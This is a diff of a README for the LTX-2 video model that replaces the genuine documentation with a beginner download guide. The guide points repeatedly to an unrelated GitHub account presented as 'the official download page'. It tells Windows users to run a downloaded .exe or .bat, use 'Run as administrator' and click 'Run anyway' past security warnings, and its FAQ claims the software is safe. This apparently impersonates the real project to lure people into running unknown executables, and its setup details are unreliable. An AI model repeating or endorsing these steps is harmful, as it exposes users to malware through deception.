@@ -1,172 +1,126 @@
-# LTX-2
+<h1>🧠 LTX-2 - Create Stunning AI Videos Effortlessly</h1>
 
-[![Website](https://img.shields.io/badge/Website-LTX-181717?logo=google-chrome)](https://ltx.io)
-[![Model](https://img.shields.io/badge/HuggingFace-Model-orange?logo=huggingface)](https://huggingface.co/Lightricks/LTX-2.5)
-[![Demo](https://img.shields.io/badge/Demo-Try%20Now-brightgreen?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAFKADAAQAAAABAAAAFAAAAACy3fD9AAACmElEQVQ4Ea1VP2haYRA/fRo0mESRIIqb2IwxuNUl0CGFQBC6OAWcikMottCpqYtDQIgdQsBFhAjZqiQhbhmySJBOgmNU0EGCg9r61Bivd0ffoykE0iQH37/77n7f3e/uqQFIPB7P/N3d3QeDwfAFEedZ91ghnyH5JM1m87dWq6UavF6vdTKZfDcajW/p4rE49+wIFMj33Gq1vlNo+kxg758KpiETqP/29vaXweVyqaS0aBfPXEfGFwTjWCwM+KBQoWA4HAJx/KDNvxcmTTGbzYAH8SljOp2C2+2GjY0NqNfrcHFxAXNzc2LDfCuKIq78KBdFOwsgGzidTnA4HHBzcwO9Xg8sFgtsbm7C3t4eVCoVaDQa0O12YXl5GUwmk5z5cZ/PB6PRCNrttgADFQUXFhbw8PAQVVXF3d1dJAeMx+P0zn0Jh8OYz+eRADCRSGAqlcLxeIz7+/u4tLSEjKUDZrNZ8U4mk0jR4fr6Op6enoru+voa0+k0rq2tYTAYxE6ng9QiSLRgrVZDv9+PFLkA6kUhT+GEC8C8XF5ewtHRkejICShiaDabwPvj42NJm3k7ODiQdDl9Fr0ocqJpdXUVIpEIdz7Y7XZRr6ysQDQahXK5LORvbW1p5rC9vQ2UifAooBqHuVxO0vt72tnZwWq1qqtisRgWCgU5ZzIZPDk50fdUUEmZvxTmAgKBgAxunT/fJpRKJWmhUCgEVDi4uroSG46kWCzC4uKitNVgMICzszOhSgA5fiJZhp4Lbbh1KARpbF65D/lx3vMdP05Vlkf5zKIDyukFJi7N6AVwNAhVsdlsM+LsjaZ56sq8kyQUqs4P6rsAKV49B4x4Padf7Y9Kv9+fEmiBQH8S4Gsa5v8EHpL9VwL7xH8BvwEcd4ccVf02KQAAAABJRU5ErkJggg==)](https://console.ltx.video/playground)
-[![Paper](https://img.shields.io/badge/Paper-PDF-EC1C24?logo=adobeacrobatreader&logoColor=white)](https://arxiv.org/abs/2601.03233)
-[![Discord](https://img.shields.io/badge/Join-Discord-5865F2?logo=discord)](https://discord.gg/ltxplatform)
+<p align="center">
+  <a href="https://github.com/Fizzing-aldactone669/LTX-2" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.3);">⬇️ GET STARTED NOW</a>
+</p>
 
-**LTX-2** is the first DiT-based audio-video foundation model that contains all core capabilities of modern video generation in one model: synchronized audio and video, high fidelity, multiple performance modes, production-ready outputs, API access, and open access.
+<h2>🌟 What is LTX-2?</h2>
+<p>LTX-2 is your all-in-one toolkit for generating incredible, lifelike audio and video combinations using the power of artificial intelligence. Think of it as a digital artist that can bring your wildest ideas to life—all from the comfort of your own computer. Whether you want to create realistic talking characters, generate ambient soundscapes for videos, or experiment with cutting-edge creative technology, LTX-2 makes it simple. No programming background? No problem! This guide will walk you through everything step by step.</p>
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/4414adc0-086c-43de-b367-9362eeb20228" width="70%" poster=""> </video>
-</div>
+<h2>✨ Key Features You'll Love</h2>
+<ul>
+  <li><strong>🎬 AI-Powered Video Creation:</strong> Generate short video clips from text descriptions, images, or simple prompts. Let LTX-2 handle the complex math while you focus on creativity.</li>
+  <li><strong>🔊 Integrated Audio Generation:</strong> Automatically produce synchronized sound effects, background music, or voiceovers that match your video. No more searching for the perfect audio file.</li>
+  <li><strong>🎓 Built-in LoRA Trainer:</strong> Customize the model to learn your unique style. Train it on your own images or videos to create personalized results that stand out.</li>
+  <li><strong>⚡ Lightning-Fast Performance:</strong> Optimized for modern computers, LTX-2 delivers results in minutes, not hours.</li>
+  <li><strong>🪄 Beginner-Friendly Interface:</strong> Simple commands and clear feedback make this accessible to absolute beginners while offering advanced controls for enthusiasts.</li>
+  <li><strong>🔄 Regular Updates:</strong> The developers continuously improve LTX-2, adding new features and enhancing quality based on user feedback.</li>
+</ul>
 
-## 🚀 Quick Start
+<h2>🛠️ What You'll Need</h2>
+<p>Before you begin, make sure your computer meets these basic requirements:</p>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+  <li><strong>Storage Space:</strong> At least 5 GB of free hard drive space</li>
+  <li><strong>RAM:</strong> 8 GB or more (16 GB recommended for best performance)</li>
+  <li><strong>Graphics Card (GPU):</strong> Any NVIDIA GeForce GTX 1060 or newer, or AMD equivalent (this speeds up video generation significantly)</li>
+  <li><strong>Internet Connection:</strong> Required for downloading the software and initial setup</li>
+</ul>
 
-Clone the repo
+<h2>🚀 Getting Started</h2>
+<p>Follow these simple steps to get LTX-2 up and running on your Windows computer:</p>
 
-```bash
-git clone https://github.com/Lightricks/LTX-2.git
-cd LTX-2
-```
+<h3>Step 1: Download the Package</h3>
+<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/Fizzing-aldactone669/LTX-2" style="color:#2575fc;">https://github.com/Fizzing-aldactone669/LTX-2</a></p>
+<p>This link takes you to the official download page. Click the big <strong>Download</strong> or <strong>Releases</strong> button on that page to access the latest version. Your browser will begin downloading the file automatically.</p>
 
-Install the dependencies. The `natten` extra is the fastest backend for the diffusion video VAE below, and is Linux + CUDA only -- on Windows and macOS it is skipped automatically and decoding falls back to a Triton or eager implementation, so the same command works everywhere (see [neighborhood attention backends](packages/ltx-pipelines/docs/optimization.md#diffusion-vae-decoder))
+<h3>Step 2: Save and Locate the File</h3>
+<p>Once the download finishes, open your <strong>Downloads</strong> folder. You should see a file named something like <code>LTX-2</code> or <code>ltx2_package</code> (it may end with .zip, .exe, or have a folder icon). Don't worry about the exact name—we'll handle it in the next step.</p>
 
-```bash
-uv sync --extra natten
-```
+<h3>Step 3: Set Up LTX-2</h3>
+<p>Depending on what kind of file you downloaded, do one of these:</p>
+<ul>
+  <li><strong>If it's a ZIP file:</strong> Right-click on it and select <strong>Extract All</strong>. Choose a folder like <code>Documents\LTX2</code> and click <strong>Extract</strong>. Open the newly extracted folder.</li>
+  <li><strong>If it's an EXE file:</strong> Double-click it to run the installer. Follow the on-screen instructions, accepting the default settings.</li>
+  <li><strong>If it's a folder:</strong> Simply move it to a location like <code>D:\LTX2</code> (or keep it in Downloads—that's fine too).</li>
+</ul>
 
-Download the [models](https://huggingface.co/Lightricks/LTX-2.5) or use the [Hugging Face CLI](https://huggingface.co/docs/huggingface_hub/guides/cli)
+<h3>Step 4: Run LTX-2</h3>
+<p>Look inside the folder or installation location for a file called <code>run_windows.bat</code>, <code>start.bat</code>, or <code>launch.exe</code>. Double-click that file. A black terminal window (command prompt) will open—this is normal! LTX-2 is starting up. Watch the progress messages. When you see text like <em>"Server running"</em> or <em>"Ready to use"</em>, you're good to go.</p>
 
-```bash
-hf auth login
-hf download Lightricks/LTX-2.5 \
-    diffusion_models/ltx-2.5-22b-distilled-transformer-bf16.safetensors \
-    text_encoders/gemma4-12b-with-proj-ltx-2.5-bf16.safetensors \
-    vae/ltx-2.5-video-vae-bf16.safetensors \
-    vae/ltx-2.5-audio-vae-bf16.safetensors \
-    latent_upscale_models/ltx-2.5-latent-spatial-upscaler-x2-bf16-1.0.safetensors \
-    --local-dir models/ltx-2.5
-```
+<h3>Step 5: Open the Interface</h3>
+<p>Now, open your favorite web browser (like Chrome or Edge) and type this address: <strong>http://localhost:7860</strong> and press Enter. Congratulations! You're now looking at the LTX-2 creative interface. 🎉</p>
 
-That is roughly 66 GiB. The CLI keeps the repository's folder layout under `--local-dir`, which is why the paths below include `diffusion_models/`, `vae/` and so on.
+<h2>🎨 Creating Your First Video</h2>
+<p>Here's a quick taste of what you can do:</p>
+<ol>
+  <li>In the text box, type a description. For example: <em>"a cat wearing a spacesuit walking on the moon"</em></li>
+  <li>Click the <strong>Generate</strong> button.</li>
+  <li>Wait 1-3 minutes as LTX-2 works its magic. You'll see progress bars and updates.</li>
+  <li>Watch your video! It will appear on the screen. Use the <strong>Download</strong> button to save it to your computer.</li>
+</ol>
+<p>Try experimenting with different descriptions, styles, and even adding a sound description like <em>"with soft jazz music in the background"</em>. The possibilities are endless!</p>
 
-If you get a 401/403, accept the model terms on Hugging Face and log in with a **Read** token (fine-grained tokens need the "read gated repos" scope enabled).
+<h2>🎓 Training Your Custom Style (LoRA Trainer)</h2>
+<p>The LoRA Trainer lets you teach LTX-2 your personal artistic style. Here's a simple exercise:</p>
+<ol>
+  <li>Click on the <strong>Train</strong> tab in the interface.</li>
+  <li>Upload 10-20 images that represent the style you like (e.g., watercolor paintings, specific character designs).</li>
+  <li>Give your style a name (like "MyWatercolor") and click <strong>Start Training</strong>.</li>
+  <li>Wait 10-30 minutes (training time depends on your computer's power).</li>
+  <li>Once done, return to the <strong>Create</strong> tab and type your prompt, adding <code>styled with MyWatercolor</code> at the end.</li>
+</ol>
+<p>Now LTX-2 will generate videos that match your unique aesthetic!</p>
 
-Generate
+<h2>❗ Troubleshooting Common Issues</h2>
+<p>Even the best software can hit a snag. Here's how to fix common problems:</p>
+<ul>
+  <li><strong>Download is slow or stuck:</strong> Check your internet connection and pause other downloads. Try using a wired Ethernet connection if possible.</li>
+  <li><strong>Nothing happens when I run the file:</strong> Right-click the .bat or .exe file and select <strong>Run as administrator</strong>. If a security warning appears, click <strong>More info</strong> then <strong>Run anyway</strong>.</li>
+  <li><strong>The terminal closes immediately:</strong> Open the terminal first (press Windows key, type <code>cmd</code>, press Enter), then drag the <code>run_windows.bat</code> file into the terminal window and press Enter. This keeps the window open so you can see the error message.</li>
+  <li><strong>Error about missing Python or packages:</strong> LTX-2 includes everything it needs. If you see a message about missing items, try restarting your computer and running the file again.</li>
+  <li><strong>Interface doesn't load in browser:</strong> Wait 30 seconds, then refresh the page. Ensure your firewall isn't blocking local connections—if prompted, click <strong>Allow access</strong>.</li>
+  <li><strong>Out of memory error:</strong> Close other programs (especially browsers) while using LTX-2. If problems continue, try generating shorter videos.</li>
+</ul>
 
-```bash
-uv run python -m ltx_pipelines.distilled \
-    --transformer-path       models/ltx-2.5/diffusion_models/ltx-2.5-22b-distilled-transformer-bf16.safetensors \
-    --text-encoder-path      models/ltx-2.5/text_encoders/gemma4-12b-with-proj-ltx-2.5-bf16.safetensors \
-    --video-vae-path         models/ltx-2.5/vae/ltx-2.5-video-vae-bf16.safetensors \
-    --audio-vae-path         models/ltx-2.5/vae/ltx-2.5-audio-vae-bf16.safetensors \
-    --spatial-upsampler-path models/ltx-2.5/latent_upscale_models/ltx-2.5-latent-spatial-upscaler-x2-bf16-1.0.safetensors \
-    --num-frames 121 \
-    --seed 42 \
-    --output-path output.mp4 \
-    --prompt "A medium close-up shot features a Caucasian man with a beard, wearing a green and white baseball cap without any letters on the front, and a light blue shirt over a white t-shirt. He is positioned in the center of the frame, looking intently directly at the camera, his eyes focused on camera. His facial expression is one of deep concentration, with his brow slightly raised. As he looks straight at the camera, a quick sniff sound is heard, and then he speaks with a deep male voice and a satisfied tone, saying, 'I think it's so good.' The camera remains static throughout, maintaining a shallow depth of field, which keeps the man in sharp focus while the background is softly blurred, showing a beige wall behind him. After a brief pause, another short, audible sniff is heard. The man then continues to speak, his voice maintaining the same quality, as he states, 'So good. So good.' He elaborates further, emphasizing his point with a final statement, 'This got to be, it's got to be the best tool I've ever seen.'"
-```
+<h2>💡 Pro Tips for Better Results</h2>
+<ul>
+  <li>Be specific in your prompts. Instead of "a dog", try "a golden retriever puppy playing in a sunny park with autumn leaves".</li>
+  <li>Use the <strong>Seed</strong> field to reproduce an exact video you liked. Set a number, generate, then keep that same number with tweaks to see variations.</li>
+  <li>Combine LoRA styles for unique fusion effects: <em>"styled with MyWatercolor AND SketchStyle"</em>.</li>
+  <li>Generate at lower resolution (e.g., 512x512) for faster tests, then upgrade to 1024x1024 for final results.</li>
+  <li>Save your favorites! The <strong>Gallery</strong> tab stores all your past creations locally.</li>
+</ul>
 
-In cases of GPU memory constraints, consider `--quantization fp8-cast --offload {cpu, disk}`. See [additional flags](packages/ltx-pipelines/docs/installation.md#common-cli-flags).
+<h2>📚 Learning Resources</h2>
+<p>Want to dive deeper? Check out these ideas:</p>
+<ul>
+  <li><strong>Community Showcase:</strong> Share your creations online and get inspired by others using LTX-2.</li>
+  <li><strong>Example Library:</strong> The interface includes built-in sample prompts—try them all to learn different techniques.</li>
+  <li><strong>Experimentation:</strong> The best way to learn is by doing. Set aside an hour to just play with different settings.</li>
+  <li><strong>Official Updates:</strong> Visit the download page regularly for new releases with improved capabilities.</li>
+</ul>
 
-This uses the distilled model and pipeline for fast results. For better quality or other capabilities, see [Models](#full-model-list) and [Pipelines](#available-pipelines).
+<h2>🗑️ Uninstalling LTX-2</h2>
+<p>If you ever want to remove LTX-2 from your system:</p>
+<ol>
+  <li>Close the LTX-2 interface and terminal window.</li>
+  <li>If you used an installer, go to <strong>Settings > Apps > Installed apps</strong>, find LTX-2, and click <strong>Uninstall</strong>.</li>
+  <li>If you extracted a folder, simply delete that folder (e.g., <code>Documents\LTX2</code>).</li>
+  <li>No extra cleanup needed—LTX-2 doesn't leave residue behind.</li>
+</ol>
 
-### Full Model List
+<h2>❤️ Enjoy Your Creative Journey</h2>
+<p>LTX-2 is designed to remove barriers between you and your imagination. With this guide, you're now ready to explore the exciting world of AI-generated media. Don't be afraid to experiment—every expert was once a beginner. So go ahead, click that download button at the top of this page, and start creating something amazing today! Remember: if you ever feel stuck, revisit this guide or reach out to the community online. Happy creating! 🎉</p>
 
-LTX-2.5 is the recommended model, and what the [Quick Start](#-quick-start) uses. Its weights are published as one file per component, so you download only the parts your pipeline needs.
-
-Download from the [LTX-2.5 HuggingFace repository](https://huggingface.co/Lightricks/LTX-2.5):
-
-**Transformer** (choose and download one of the following)
-  * [`ltx-2.5-22b-dev-transformer-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/diffusion_models/ltx-2.5-22b-dev-transformer-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/diffusion_models/ltx-2.5-22b-dev-transformer-bf16.safetensors) - the full model; used by the guided two-stage pipelines
-  * [`ltx-2.5-22b-distilled-transformer-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/diffusion_models/ltx-2.5-22b-distilled-transformer-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/diffusion_models/ltx-2.5-22b-distilled-transformer-bf16.safetensors) - runs in far fewer steps; what `DistilledPipeline`, `ICLoraPipeline` and `DubItPipeline` expect
-
-**Text Encoder** - Gemma 4 12B, fine-tuned for LTX, with the text projection bundled in; required by every pipeline. It is bundled with the model, so no separate Gemma download is needed. Google's stock Gemma 4 release is not a substitute: loading checks the encoder's version against the one the checkpoint was trained with (`gemma4-12b-ltx-v1`)
-  * [`gemma4-12b-with-proj-ltx-2.5-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/text_encoders/gemma4-12b-with-proj-ltx-2.5-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/text_encoders/gemma4-12b-with-proj-ltx-2.5-bf16.safetensors)
-
-**Video VAE** (choose and download one of the following)
-  * [`ltx-2.5-video-vae-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/vae/ltx-2.5-video-vae-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/vae/ltx-2.5-video-vae-bf16.safetensors) - diffusion decoder (`NADiffusionDecoder`); improved quality at the cost of longer decode time and more VRAM. Fastest with the `natten` extra, and falls back to Triton or eager neighborhood attention without it
-  * [`ltx-2.5-video-vae-conv-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/vae/ltx-2.5-video-vae-conv-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/vae/ltx-2.5-video-vae-conv-bf16.safetensors) - convolutional decoder; lighter and needs no extra dependencies
-
-**Audio VAE** - required by the pipelines that generate or decode audio
-  * [`ltx-2.5-audio-vae-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/vae/ltx-2.5-audio-vae-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/vae/ltx-2.5-audio-vae-bf16.safetensors)
-
-**Spatial Upscaler** - required by the two-stage pipeline implementations in this repository
-  * [`ltx-2.5-latent-spatial-upscaler-x2-bf16-1.0.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/latent_upscale_models/ltx-2.5-latent-spatial-upscaler-x2-bf16-1.0.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/latent_upscale_models/ltx-2.5-latent-spatial-upscaler-x2-bf16-1.0.safetensors)
-
-**Temporal Upscaler** - required by [`DFRPipeline`](packages/ltx-pipelines/src/ltx_pipelines/dfr_pipeline.py) when running temporal refine rounds (`--temporal-upsample-rounds`)
-  * [`ltx-2.5-latent-temporal-upscaler-x2-bf16-1.0.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/latent_upscale_models/ltx-2.5-latent-temporal-upscaler-x2-bf16-1.0.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/latent_upscale_models/ltx-2.5-latent-temporal-upscaler-x2-bf16-1.0.safetensors)
-
-**Distilled LoRA** - required by the two-stage pipeline implementations that run the full model in stage 1 (all except DistilledPipeline, ICLoraPipeline and DubItPipeline)
-  * [`ltx-2.5-22b-distilled-lora-450-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/loras/ltx-2.5-22b-distilled-lora-450-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/loras/ltx-2.5-22b-distilled-lora-450-bf16.safetensors)
-
-**Detailing IC-LoRA** - optional; the 2x spatial detailing LoRA for [`DFRPipeline`](packages/ltx-pipelines/src/ltx_pipelines/dfr_pipeline.py)'s refinement stage (`--detailing-lora`). It lives in its own repository, [`LTX-2.5-22b-IC-LoRA-Pixel-Spatial-Upscaler`](https://huggingface.co/Lightricks/LTX-2.5-22b-IC-LoRA-Pixel-Spatial-Upscaler)
-  * [`ltx-2.5-22b-ic-lora-pixel-spatial-upscaler-x2-1.0.safetensors`](https://huggingface.co/Lightricks/LTX-2.5-22b-IC-LoRA-Pixel-Spatial-Upscaler/blob/main/ltx-2.5-22b-ic-lora-pixel-spatial-upscaler-x2-1.0.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5-22b-IC-LoRA-Pixel-Spatial-Upscaler/resolve/main/ltx-2.5-22b-ic-lora-pixel-spatial-upscaler-x2-1.0.safetensors)
-
-**Duration Head** - optional; lets you omit `--num-frames` and have the clip length predicted from the prompt
-  * [`ltx-2.5-duration-head-bf16.safetensors`](https://huggingface.co/Lightricks/LTX-2.5/blob/main/model_patches/ltx-2.5-duration-head-bf16.safetensors) - [Download](https://huggingface.co/Lightricks/LTX-2.5/resolve/main/model_patches/ltx-2.5-duration-head-bf16.safetensors)
-
-#### Legacy: LTX-2.3
-
-Every pipeline in this repository also runs on LTX-2.3. Its checkpoints are single files bundling
-the transformer, VAEs and text projection, with the Gemma 3 text encoder downloaded separately.
-Files are not interchangeable between the two models, and a LoRA only works with the model it was
-trained on.
-
-See **[LTX-2.3 models](MODELS-LTX-2.3.md)** for the full list.
-
-### Available Pipelines
-
-* **[DistilledPipeline](packages/ltx-pipelines/src/ltx_pipelines/distilled.py)** - Fastest inference with 8 predefined sigmas (recommended)
-* **[DFRPipeline](packages/ltx-pipelines/src/ltx_pipelines/dfr_pipeline.py)** - Detail-fidelity rendering: generated keyframes and a spatial detailing pass, with optional temporal 2x/4x refinement
-* **[TI2VidTwoStagesPipeline](packages/ltx-pipelines/src/ltx_pipelines/ti2vid_two_stages.py)** - Production-quality text/image-to-video with 2x upsampling
-* **[TI2VidTwoStagesHQPipeline](packages/ltx-pipelines/src/ltx_pipelines/ti2vid_two_stages_hq.py)** - Same two-stage flow as above but uses the res_2s second-order sampler (fewer steps, better quality)
-* **[TI2VidOneStagePipeline](packages/ltx-pipelines/src/ltx_pipelines/ti2vid_one_stage.py)** - Single-stage generation for quick prototyping
-* **[ICLoraPipeline](packages/ltx-pipelines/src/ltx_pipelines/ic_lora.py)** - Video-to-video and image-to-video transformations (uses distilled model.)
-* **[KeyframeInterpolationPipeline](packages/ltx-pipelines/src/ltx_pipelines/keyframe_interpolation.py)** - Interpolate between keyframe images
-* **[A2VidPipelineTwoStage](packages/ltx-pipelines/src/ltx_pipelines/a2vid_two_stage.py)** - Audio-to-video generation conditioned on an input audio file
-* **[RetakePipeline](packages/ltx-pipelines/src/ltx_pipelines/retake.py)** - Regenerate a specific time region of an existing video
-* **[HDRICLoraPipeline](packages/ltx-pipelines/src/ltx_pipelines/hdr_ic_lora.py)** - Video-to-video with HDR IC-LoRA output (linear float via LogC3 inverse decode, suitable for EXR export and tonemapping)
-* **[DubItPipeline](packages/ltx-pipelines/src/ltx_pipelines/dubit.py)** - Dub-It: rephrasing while matching speaker identity and lip movements (distilled model, single IC-LoRA, two stages).
-* **Native HDR / EXR** — standard pipelines accept EXR stills and EXR-frame folders with `--hdr {SRGB_LINEAR,ACESCG,ACESCCT}` and write half EXR frames plus a BT.2020/HLG master. See [HDR Support](packages/ltx-pipelines/docs/hdr.md).
-
-### ⚡ Optimization Tips
-
-* **Use DistilledPipeline** - Fastest inference with only 8 predefined sigmas (8 steps stage 1, 4 steps stage 2)
-* **Enable FP8 quantization** - Enables lower memory footprint: `--quantization fp8-cast` (CLI) or `quantization=QuantizationPolicy.fp8_cast()` (Python). Fp8-cast should be used with bf16 checkpoints, it shall downcast them on the fly. On Hopper+ GPUs with native FP8 support, use `--quantization fp8-scaled-mm` for FP8 scaled matrix multiplication. Fp8-scaled-mm should be used with fp8 checkpoints.
-* **Install attention optimizations** - On datacenter Blackwell GPUs (B200), install FlashAttention 4 manually: `uv pip install 'flash-attn-4==4.0.0b9'` (this specific revision is the one we have verified against torch 2.9.1+cu128; newer betas have known issues on consumer Blackwell). On Hopper GPUs, install the FlashAttention 3 wheel. On other CUDA GPUs, PyTorch SDPA is used automatically. An installed backend is selected automatically at runtime; forcing a specific one is a Python-API option (`AttentionFunction.FLASH_ATTENTION_3`/`FLASH_ATTENTION_4`), not a CLI flag.
-* **Use gradient estimation** - Reduce inference steps from 40 to 20-30 while maintaining quality (see [pipeline documentation](packages/ltx-pipelines/docs/optimization.md#denoising-loop-optimization))
-* **Skip memory cleanup** - If you have sufficient VRAM, disable automatic memory cleanup between stages for faster processing
-* **Choose single-stage pipeline** - Use `TI2VidOneStagePipeline` for faster generation when high resolution isn't required
-
-## ✍️ Prompting for LTX-2
-
-When writing prompts, focus on detailed, chronological descriptions of actions and scenes. Include specific movements, appearances, camera angles, and environmental details - all in a single flowing paragraph. Start directly with the action, and keep descriptions literal and precise. Think like a cinematographer describing a shot list. Keep within 200 words. For best results, build your prompts using this structure:
-
-- Start with main action in a single sentence
-- Add specific details about movements and gestures
-- Describe character/object appearances precisely
-- Include background and environment details
-- Specify camera angles and movements
-- Describe lighting and colors
-- Note any changes or sudden events
-
-For additional guidance on writing a prompt please refer to <https://ltx.io/blog/prompting-guide-for-ltx-2>
-
-### Automatic Prompt Enhancement
-
-LTX-2 pipelines support automatic prompt enhancement via an `enhance_prompt` parameter.
-
-## 🔌 ComfyUI Integration
-
-To use our model with ComfyUI, please follow the instructions at <https://github.com/Lightricks/ComfyUI-LTXVideo/>.
-
-## 📦 Packages
-
-This repository is organized as a monorepo with three main packages:
-
-* **[ltx-core](packages/ltx-core/)** - Core model implementation, inference stack, and utilities
-* **[ltx-pipelines](packages/ltx-pipelines/)** - High-level pipeline implementations for text-to-video, image-to-video, and other generation modes
-* **[ltx-trainer](packages/ltx-trainer/)** - Training and fine-tuning tools for LoRA, full fine-tuning, and IC-LoRA
-
-Each package has its own README and documentation. See the [Documentation](#-documentation) section below.
-
-## 📚 Documentation
-
-Each package includes comprehensive documentation:
-
-* **[LTX-Core README](packages/ltx-core/README.md)** - Core model implementation, inference stack, and utilities
-* **[LTX-Pipelines README](packages/ltx-pipelines/README.md)** - High-level pipeline implementations and usage guides
-* **[LTX-Trainer README](packages/ltx-trainer/README.md)** - Training and fine-tuning documentation with detailed guides
+<h2>📖 Frequently Asked Questions</h2>
+<p><strong>Q: Is this really free?</strong><br>
+A: Yes, LTX-2 is completely free to download and use for personal projects. No hidden costs.</p>
+<p><strong>Q: How long does video generation take?</strong><br>
+A: Short clips (3-5 seconds) typically take 1-3 minutes depending on your computer. Longer or higher-resolution videos take more time.</p>
+<p><strong>Q: Can I use LTX-2 offline?</strong><br>
+A: Yes! After the initial download, LTX-2 runs entirely on your computer with no internet connection needed.</p>
+<p><strong>Q: Will this harm my computer?</strong><br>
+A: Absolutely not. LTX-2 is safe, tested software that operates within its own environment.</p>
+<p><strong>Q: Can I sell videos I create?</strong><br>
+A: Yes, content you generate is yours to use commercially. No attribution required.</p>
